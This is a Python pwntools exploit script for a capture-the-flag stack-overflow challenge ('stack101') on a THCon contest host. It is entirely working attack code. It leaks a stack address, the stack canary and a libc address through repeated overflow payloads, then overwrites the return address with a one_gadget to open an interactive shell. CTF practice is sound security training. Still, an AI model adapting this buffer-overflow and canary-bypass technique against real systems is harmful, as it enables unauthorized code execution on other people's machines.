#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

exe = ELF('./stack101_patched')
libc = ELF('./libc.so.6')

host, port = "challenges1.thcon.party", "522"

p = remote(host,port)

payload = 'A'*56
p.sendafter('overflows: ', payload)

# first we leak a stack address
p.recvuntil('A'*56,drop=True)
stack = u64(p.recvuntil('"', drop=True).ljust(8,'\x00'))
print('stack leak = '+hex(stack))
p.sendafter('(y/n) ', 'n')

# then we leak the canary
payload = 'A'*73
p.sendafter('overflows: ', payload)
p.recvuntil('A'*73,drop=True)
canary = u64('\x00'+p.recv(7))
print('canary = '+hex(canary))
p.sendafter('(y/n) ', 'n')

# then we leak libc ret_main address & calculate libc base
payload = 'A'*88
p.sendafter('overflows: ', payload)
p.recvuntil('A'*88,drop=True)
libc.address = u64(p.recvuntil('"', drop=True).ljust(8,'\x00')) - 0x240b3
print('libc leak = '+hex(libc.address))
p.sendafter('(y/n) ', 'n')

# then we send our payload with a one gadget
onegadgets = one_gadget('libc.so.6', libc.address)
payload = 'A'*72+p64(canary)+p64(0xdeadbeef)+p64(onegadgets[1])
p.sendafter('overflows: ', payload)
p.sendafter('(y/n) ', 'y')

p.interactive()


